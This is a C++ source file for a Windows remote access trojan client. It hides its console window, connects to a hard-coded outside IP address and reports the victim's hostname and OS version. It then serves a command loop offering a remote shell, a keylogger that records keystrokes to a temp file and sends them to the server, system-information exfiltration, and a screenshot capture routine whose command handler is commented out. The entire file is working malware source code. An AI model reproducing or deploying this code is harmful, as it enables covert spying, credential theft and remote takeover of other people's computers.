#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _WIN32_WINNT 0x0500

#pragma comment(lib, "ws2_32.lib")

#include <iostream>
#include <cstdio>
#include <conio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <cstring>
#include <string>
#include <fstream>
#include <streambuf>
#include <stdexcept>
#include <winuser.h>
#include <winbase.h>
#include <future>
#include <atlimage.h>
#include <wingdi.h>

#define PACKET_SIZE 10240

using namespace std;

string exec(string command)
{
    char buffer[128];
    string result = "";

    command += " &";
    // Open pipe to file
    FILE* pipe;
    pipe = _popen(command.c_str(), "r");
    if (!pipe)
    {
        return "POPEN FAILED!";
    }

    // read till end of process:
    while (!feof(pipe))
    {
        // use buffer to read and add to result
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }

    _pclose(pipe);
    return result;
}

void StartLogging();

string Shell(string rcv)
{
    string data;

    std::future<string> f = std::async(std::launch::async, exec, rcv);
    std::future_status status;

    f.wait();
    data = f.get();

    /*status = f.wait_for(std::chrono::milliseconds(200)); //0.2secs
    if(status == std::future_status::ready)
    {
        data = f.get();
    }
    else if(status == std::future_status::timeout)
    {
        status = f.wait_for(std::chrono::seconds(5)); //Wait for 5 secs
        if(status == std::future_status::ready)
        {
            data = f.get();
        }
        else if(status == std::future_status::timeout)
        {
            data = "TIMEOUT";
        }
    }*/

    if (data.empty())
    {
        data = ".\n";
    }

    return data;
}

char CaptureBuffer[1000001];
int CaptureBufferSize;

void Capture()
{
	HDC hScreenDC = CreateDC(L"DISPLAY", NULL, NULL, NULL);

	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);

	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);

	HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
	hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);


	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);

	CImage image;
	image.Attach(hBitmap);
	image.Save(_T("Capture.jpg"));

    ifstream in;
    in.open("Capture.jpg", ios::binary);
    string s;

    in.seekg(0, ios::end);
    CaptureBufferSize = in.tellg();
    in.seekg(0, ios::beg);

    in.read(CaptureBuffer, CaptureBufferSize);
    in.close();
}

int KeyLoggingStatus = 0; // [0 : Stop], [1 : Start], [2 : Dump Keystrokes]
string KeyStrokes;

string commands[] = { "help", "sysinfo", "exitconn", "shell", "keyscan_start", "keyscan_stop", "keyscan_dump", "cd"};

bool CheckCommand(string command)
{
    int l = sizeof(commands) / sizeof(commands[0]);
    for (int i = 0; i < l; i++)
    {
        if (commands[i].compare(command) == 0)
        {
            return true;
        }
    }
    return false;
}

//MAIN===========================================================================================

int main()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    //char SERVER_IP[31] = "192.168.35.184";
    //int PORT = 4454;
    char SERVER_IP[31] = "175.112.67.13";
    int PORT = 20;

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    SOCKET hSocket;
    hSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN tAddr = {};
    tAddr.sin_family = AF_INET;
    tAddr.sin_port = htons(PORT);
    tAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    connect(hSocket, (SOCKADDR*)&tAddr, sizeof(tAddr));
    printf("Successfully Connected To Server\n");

    string hostname_ = exec("hostname");
    string ver_ = exec("ver");
    char cMsg_[1001];
    sprintf(cMsg_, "Client Hostname: %sClient OS Version: %s\n", hostname_.c_str(), ver_.c_str());
    send(hSocket, cMsg_, strlen(cMsg_), 0); //Sends Client Information to Server

    std::future<void> AsyncKeyLogging;

    while (true)
    {
        char cBuffer[PACKET_SIZE] = {};
        recv(hSocket, cBuffer, PACKET_SIZE, 0);
        string rcv(cBuffer);

        if (CheckCommand(rcv) == false)
        {
            char cMsg[] = "Unknown command. See \"help\" for commands.\n";
            send(hSocket, cMsg, strlen(cMsg), 0);
            continue;
        }

        if (rcv.compare("-1") == 0)
        {
            printf("Server Side Terminated\n");
            closesocket(hSocket);
            WSACleanup();

            system("pause");
            exit(0);
        }

        if (rcv.compare("help") == 0)
        {
            string data = "Commands:\n\n"
                "sysinfo : Get Client System Information\n"
                "exitconn : Exit\n"
                "shell : Drop into Client System Shell\n"
                "keyscan_start : Starts Keylogging in Client System\n"
                "keyscan_stop : Stops Keylogging\n"
                "keyscan_dump : Shows Captured Keystrokes and Clears Them\n"
                "capture : Take Screenshot of Client and Displays it\n"
                "cd : Shows Current Directory\n";
            char cMsg[2001];
            strcpy(cMsg, data.c_str());
            send(hSocket, cMsg, strlen(cMsg), 0);
            continue;
        }
        else if (rcv.compare("shell") == 0)
        {
            char cMsg[] = "Starting Shell...\n";
            send(hSocket, cMsg, strlen(cMsg), 0);

            while (true)
            {
                char cBuffer[PACKET_SIZE] = {};
                recv(hSocket, cBuffer, PACKET_SIZE, 0);
                string rcv(cBuffer);

                if (rcv.compare("exit") == 0)
                {
                    char cMsg[] = "Exiting Shell...\n";
                    send(hSocket, cMsg, strlen(cMsg), 0);
                    break;
                }

                if (int pos = rcv.find("cd ") != string::npos)
                {
                    string dir = rcv.substr(pos + 2);
                    if (SetCurrentDirectoryA(dir.c_str()))
                    {
                        char cMsg[] = "Directory Changed\n";
                        send(hSocket, cMsg, strlen(cMsg), 0);
                        continue;
                    }
                    else
                    {
                        char cMsg[] = "Directory Change Failed\n";
                        send(hSocket, cMsg, strlen(cMsg), 0);
                        continue;
                    }
                }

                string data = Shell(rcv);

                char cMsg[1001];
                strcpy(cMsg, data.c_str());
                send(hSocket, cMsg, strlen(cMsg), 0);
            }
        }
        else if (rcv.compare("keyscan_start") == 0)
        {
            if (KeyLoggingStatus == 1 || KeyLoggingStatus == 2) //already start
            {
                char cMsg[] = "KeyLogging is already running.\n";
                send(hSocket, cMsg, strlen(cMsg), 0);
                continue;
            }
            KeyLoggingStatus = 1; //Enable

            AsyncKeyLogging = std::async(std::launch::async, StartLogging); //Starts Asynchronous KeyLogging

            char cMsg[] = "Starting KeyLogging...\n";
            send(hSocket, cMsg, strlen(cMsg), 0);
            continue;
        }
        else if (rcv.compare("keyscan_stop") == 0)
        {
            if (KeyLoggingStatus == 0) //already stop
            {
                char cMsg[] = "KeyLogging is already stopped.\n";
                send(hSocket, cMsg, strlen(cMsg), 0);
                continue;
            }
            KeyLoggingStatus = 0; //Will Stop KeyLogging
            char cMsg[] = "KeyLogging stopped.\n";
            send(hSocket, cMsg, strlen(cMsg), 0);
            continue;
        }
        else if (rcv.compare("keyscan_dump") == 0)
        {
            if (KeyLoggingStatus == 0)
            {
                char cMsg[] = "KeyLogging is already running.\n";
                send(hSocket, cMsg, strlen(cMsg), 0);
                continue;
            }
            KeyLoggingStatus = 2; // KeyStrokes to std::string KeyStrokes

            while (KeyLoggingStatus != 1) { cout << ""; }

            char cMsg[1001];
            char ch[1001];
            strcpy(ch, KeyStrokes.c_str());
            sprintf(cMsg, "Dumping KeyStrokes...\n\n%s", ch);
            send(hSocket, cMsg, strlen(cMsg), 0);
            continue;
        }
        else if (rcv.compare("cd") == 0)
        {
            string data = Shell("cd");
            char cMsg[501];
            strcpy(cMsg, data.c_str());
            send(hSocket, cMsg, strlen(cMsg), 0);
            continue;
        }
        else if (rcv.compare("sysinfo") == 0)
        {
            //string data = Shell("powershell \"systeminfo | Select -First 5\"");
            string data = Shell("systeminfo");
            char cMsg[5001];
            strcpy(cMsg, data.c_str());
            send(hSocket, cMsg, strlen(cMsg), 0);
            continue;
        }
        /*else if (rcv.compare("capture") == 0)
        {
            Capture(); //CaptureBuffer, CaptureBufferSize
            cout << "CaptureBufferSize : " << CaptureBufferSize << endl;
            char size[101];
            sprintf(size, "%d", CaptureBufferSize);
            send(hSocket, size, strlen(size), 0); //send buffer size

            char cBuffer[PACKET_SIZE] = {};
            recv(hSocket, cBuffer, PACKET_SIZE, 0); //receive 1 by server

            send(hSocket, CaptureBuffer, sizeof(CaptureBuffer), 0); //send capture buffer (ios::binary)
            
            char cB[PACKET_SIZE] = {};
            recv(hSocket, cB, PACKET_SIZE, 0);
            cout << "Server completed imaging : " << cB << endl;

            char cMsg[] = "Capture Complete.\n";
            send(hSocket, cMsg, strlen(cMsg), 0);

            continue;
        }*/
    }

    return 0;
}


//Function Declaration ============================================

void StartLogging()
{
    char c;
    char filename[] = "records.tmp";
    ifstream f;
    f.open(filename, ifstream::out | ifstream::trunc);
    f.close();
    for (;;)
    {
        for (c = 8; c <= 222; c++)
        {
            if (KeyLoggingStatus == 0) //Stop
            {
                return;
            }
            else if (KeyLoggingStatus == 2) //Dumps Current Keystrokes
            {
                ifstream f;
                f.open(filename);
                string S((std::istreambuf_iterator<char>(f)),
                    std::istreambuf_iterator<char>());
                KeyStrokes = S;
                f.close();
                ifstream t;
                t.open(filename, ifstream::out | ifstream::trunc);
                t.close();

                KeyLoggingStatus = 1;
            }

            if (GetAsyncKeyState(c) == -32767)
            {
                ofstream write(filename, ios::app);

                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91))
                {
                    write << c;
                    write.close();
                    break;
                }
                else
                {
                    switch (c)
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << ")";
                        else
                            write << "0";
                    }
                    break;

                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "!";
                        else
                            write << "1";
                    }
                    break;

                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "@";
                        else
                            write << "2";
                    }
                    break;

                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "#";
                        else
                            write << "3";
                    }
                    break;

                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "$";
                        else
                            write << "4";
                    }
                    break;
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "%";
                        else
                            write << "5";
                    }
                    break;
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "^";
                        else
                            write << "6";
                    }
                    break;
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "&";
                        else
                            write << "7";
                    }
                    break;
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "*";
                        else
                            write << "8";
                    }
                    break;
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "(";
                        else
                            write << "9";
                    }
                    break;

                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "<ENTER>";
                        break;
                    case VK_TAB:
                        write << "<TAB>";
                        break;
                    case VK_BACK:
                        write << "<BS>";
                        break;
                    case VK_DELETE:
                        write << "<Del>";
                        break;

                    default:
                        write << c;
                    }
                }
            }
        }
    }
}
